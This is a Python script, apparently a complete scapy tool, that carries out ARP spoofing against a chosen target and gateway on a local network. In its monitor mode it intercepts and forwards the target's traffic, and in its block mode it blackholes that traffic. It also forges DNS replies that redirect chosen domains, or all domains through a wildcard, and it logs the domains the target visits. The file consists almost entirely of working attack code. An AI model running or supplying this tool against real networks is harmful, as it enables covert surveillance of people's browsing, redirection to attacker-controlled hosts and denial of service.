
import sys
import os
import time
import threading
import logging
import argparse
from scapy.all import *

import signal
import json

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

STATS_FILE = "traffic_stats.json"

class TrafficMonitor(threading.Thread):
    def __init__(self, target_ip, gateway_ip, spoof_dns_domains=None, interface=None, action="monitor"):
        super().__init__()
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.action = action # "monitor" or "block"
        self.spoof_dns_domains = spoof_dns_domains or {} # {'example.com': '1.2.3.4'}
        self.stop_event = threading.Event()
        self.target_mac = None
        self.gateway_mac = None
        
        self.statistics = {
            "target_ip": target_ip,
            "upload_bytes": 0,
            "download_bytes": 0,
            "top_domains": [], # List of strings
            "recent_sites": [] # List of {domain, timestamp}
        }
        self.lock = threading.Lock()

    def _get_mac(self, ip):
        """Resolves MAC address for a given IP."""
        try:
            logging.info(f"Resolving MAC for {ip}...")
            # Send ARP request to get MAC
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0, iface=self.interface)
            if ans:
                return ans[0][1].hwsrc
        except Exception as e:
            logging.error(f"Error resolving MAC: {e}")
        return None

    def enable_ip_forwarding(self):
        """Enables IP forwarding on the system."""
        try:
            if sys.platform == "darwin":
                os.system('sysctl -w net.inet.ip.forwarding=1')
            else:
                 # Linux
                os.system('sysctl -w net.ipv4.ip_forward=1')
            logging.info("IP Forwarding enabled.")
        except Exception as e:
            logging.error(f"Failed to enable IP forwarding: {e}")

    def disable_ip_forwarding(self):
        """Disables IP forwarding."""
        try:
             if sys.platform == "darwin":
                os.system('sysctl -w net.inet.ip.forwarding=0')
             else:
                os.system('sysctl -w net.ipv4.ip_forward=0')
             logging.info("IP Forwarding disabled.")
        except Exception as e:
            logging.error(f"Failed to disable IP forwarding: {e}")

    def _arp_spoof_loop(self):
        """Continuously sends forged ARP packets."""
        logging.info(f"Starting ARP spoofing loop (Action: {self.action})...")
        
        # In BLOCK mode, we tell target/gateway to send traffic to a dead MAC
        # In MONITOR mode, we tell them to send to US (so we can sniff & forward)
        
        # What IP am I pretending to be? 
        # To Target: "I am Gateway"
        # To Gateway: "I am Target"
        
        # What MAC should they send to?
        # Monitor: My Real MAC (so I receive it)
        # Block: Random Dead MAC (so it drops)
        
        my_mac = get_if_hwaddr(self.interface or conf.iface)
        spoof_mac = my_mac if self.action == "monitor" else "de:ad:be:ef:ca:fe"
        
        while not self.stop_event.is_set():
            try:
                # Tell Target that Gateway is at spoof_mac
                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=self.target_mac, hwsrc=spoof_mac), verbose=0, iface=self.interface)
                # Tell Gateway that Target is at spoof_mac
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst=self.gateway_mac, hwsrc=spoof_mac), verbose=0, iface=self.interface)
            except Exception as e:
                logging.error(f"Error in ARP spoof loop: {e}")
            time.sleep(2)

    def restore_arp(self):
        """Restores ARP tables."""
        logging.info("Restoring ARP tables...")
        try:
            if self.target_mac and self.gateway_mac:
                # Restore Target: Tell Target valid Gateway MAC
                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac), count=5, verbose=0, iface=self.interface)
                # Restore Gateway: Tell Gateway valid Target MAC
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac), count=5, verbose=0, iface=self.interface)
        except Exception as e:
            logging.error(f"Error restoring ARP: {e}")

    def _dns_spoof(self, pkt):
        """Spoofs DNS responses if domain matches."""
        # Only process DNS Queries (qr=0) that are UDP
        if DNS in pkt and pkt[DNS].qr == 0 and UDP in pkt:
            try:
                qname = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
                
                # Check directly or wildcard
                spoofed_ip = self.spoof_dns_domains.get(qname)
                if not spoofed_ip and '*' in self.spoof_dns_domains:
                     spoofed_ip = self.spoof_dns_domains['*'] # Wildcard

                if spoofed_ip:
                    logging.info(f"Spoofing DNS query for {qname} -> {spoofed_ip}")
                    
                    # Create spoofed response
                    # Swap src/dst IP and ports
                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                      an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=spoofed_ip))
                    
                    send(spoofed_pkt, verbose=0, iface=self.interface)
                    return True
            except Exception as e:
                logging.error(f"Error spoofing DNS: {e}")
        return False

    def _save_stats(self):
        """Saves current statistics to JSON file."""
        with self.lock:
            try:
                # Add timestamp
                data = self.statistics.copy()
                data['timestamp'] = time.time()
                
                # Write to temp file then rename (atomic)
                tmp_file = STATS_FILE + ".tmp"
                with open(tmp_file, 'w') as f:
                    json.dump(data, f)
                os.rename(tmp_file, STATS_FILE)
            except Exception as e:
                logging.error(f"Error saving stats: {e}")

    def sniff_packets(self, pkt):
        """Callback for packet processing."""
        # 1. DNS Spoofing Check
        self._dns_spoof(pkt)

        # 2. Statistics
        if IP in pkt:
            with self.lock:
                self.statistics["upload_bytes"] += len(pkt)
                self.statistics["download_bytes"] += len(pkt)

        if DNSQR in pkt and pkt[DNSQR].qtype == 1: # A Record
            try:
                domain = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
                with self.lock:
                    # Update top domains
                    if domain not in self.statistics["top_domains"]:
                        self.statistics["top_domains"] = ([domain] + self.statistics["top_domains"])[:10]
                        logging.info(f"Visited: {domain}")
                    
                    # Update recent sites
                    self.statistics["recent_sites"].insert(0, {
                        "domain": domain,
                        "timestamp": time.time()
                    })
                    self.statistics["recent_sites"] = self.statistics["recent_sites"][:50]
                
                self._save_stats()
            except Exception:
                pass
        
        # Periodic save logic could go here, but doing it on DNS event + timer to keep it fresh
        pass

    def _stats_loop(self):
        """Periodically save stats."""
        while not self.stop_event.is_set():
            self._save_stats()
            time.sleep(1)

    def run(self):
        logging.info(f"Initializing TrafficMonitor for Target: {self.target_ip}, Gateway: {self.gateway_ip}")
        
        # 1. Resolve MACs
        self.target_mac = self._get_mac(self.target_ip)
        self.gateway_mac = self._get_mac(self.gateway_ip)

        if not self.target_mac:
            logging.error(f"Could not resolve MAC for target {self.target_ip}. Host might be down.")
            return
        if not self.gateway_mac:
            logging.error(f"Could not resolve MAC for gateway {self.gateway_ip}. Host might be down.")
            return

        logging.info(f"Target MAC: {self.target_mac} | Gateway MAC: {self.gateway_mac}")

        # 2. Enable Forwarding (Only for Monitor mode)
        if self.action == "monitor":
            self.enable_ip_forwarding()
        else:
            logging.info("Block mode: IP Forwarding not enabled (traffic will be blackholed).")
        
        # 3. Start ARP Spoofing Thread
        arp_thread = threading.Thread(target=self._arp_spoof_loop, daemon=True)
        arp_thread.start()

        # 4. Start Stats Saver Thread
        stats_thread = threading.Thread(target=self._stats_loop, daemon=True)
        stats_thread.start()

        # 4. Start Sniffing (Blocking)
        try:
            if self.action == "monitor":
                logging.info(f"Sniffing started on {self.interface or 'default'}...")
                try:
                    sniff(
                        prn=self.sniff_packets, 
                        store=0, 
                        stop_filter=lambda x: self.stop_event.is_set(),
                        iface=self.interface
                    )
                except Exception as e:
                    logging.error(f"Sniffer error: {e}")
            else:
                # Just keep thread alive for blocking loop
                logging.info("Blocking active. Press Ctrl+C to stop.")
                while not self.stop_event.is_set():
                    time.sleep(1)
        finally:
            self.stop()

    def stop(self):
        if self.stop_event.is_set():
            return  # Already stopped
        logging.info("Stopping TrafficMonitor...")
        self.stop_event.set()
        time.sleep(1) # Give threads time to notice
        self.restore_arp()
        if self.action == "monitor":
            self.disable_ip_forwarding()
        
        # Clean up stats file
        if os.path.exists(STATS_FILE):
            try:
                os.remove(STATS_FILE)
            except: pass
            
        logging.info("Stopped.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Traffic Monitor with ARP & DNS Spoofing")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    parser.add_argument("-i", "--interface", help="Network interface (e.g., eth0, wlan0)")
    parser.add_argument("--action", choices=["monitor", "block"], default="monitor", help="Action to perform")
    parser.add_argument("--dns", help="Domain to spoof (format: domain=ip)", action="append") # --dns example.com=1.2.3.4
    
    args = parser.parse_args()
    
    # Needs root/admin privileges
    if os.geteuid() != 0:
        logging.error("This script requires root privileges. Please run with sudo.")
        sys.exit(1)

    dns_map = {}
    if args.dns:
        for item in args.dns:
            try:
                parts = item.split('=')
                if len(parts) == 2:
                    dns_map[parts[0]] = parts[1]
            except ValueError:
                pass
    
    monitor = TrafficMonitor(args.target, args.gateway, spoof_dns_domains=dns_map, interface=args.interface, action=args.action)
    
    def handle_signal(signum, frame):
        logging.info("Signal received, shutting down...")
        monitor.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    monitor.start()
    
    try:
        # Keep main thread alive
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        monitor.stop()
